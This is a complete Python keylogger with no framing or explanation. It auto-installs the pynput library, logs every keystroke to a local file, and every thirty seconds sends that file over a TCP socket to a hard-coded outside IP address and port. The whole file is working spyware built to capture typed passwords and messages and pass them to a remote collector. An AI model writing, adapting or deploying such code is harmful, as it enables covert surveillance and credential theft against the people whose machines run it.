try:
    import os
    import socket
    import time
    import pynput
except ImportError:
    from subprocess import call
    modules = ["pynput"]
    call("pip install " + ' '.join(modules), shell=True)
finally:
    from pynput import keyboard
    from pynput.keyboard import Key,Listener

    machine = "58.186.195.124"
    port = 9999

        
    def sender():
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((machine, port))
            
            with open("log.txt", 'rb') as file:
                data = file.read(1024)
                while data:
                    print("Sending data")
                    client.send(data)
                    data = file.read(1024)
                print("Data sent successfully")
                client.close()
        except Exception as e:
            print(f"Failed to send data: {e}")
            
    def write_to_file(key):
        mess = ''
        if key == Key.space:
            mess = ' '
        elif key == Key.enter:
            mess = "\n"
        elif key == Key.shift_r or key == Key.shift_l:
            mess = ''
        elif key == Key.alt_r or key == Key.alt_l:
            mess = " Key.alt "
        elif key == Key.ctrl_r or key == Key.ctrl_l:
            mess = " Key.ctrl "
        else:
            try:
                mess = str(key.char)
            except AttributeError:
                pass

        with open("log.txt", 'a', encoding='utf-8') as f:
            f.write(str(mess))
    
    if __name__ == "__main__":
        with Listener(on_press=write_to_file) as l:
            try:
                while True:
                    time.sleep(30)   
                    sender()
            except KeyboardInterrupt:
                pass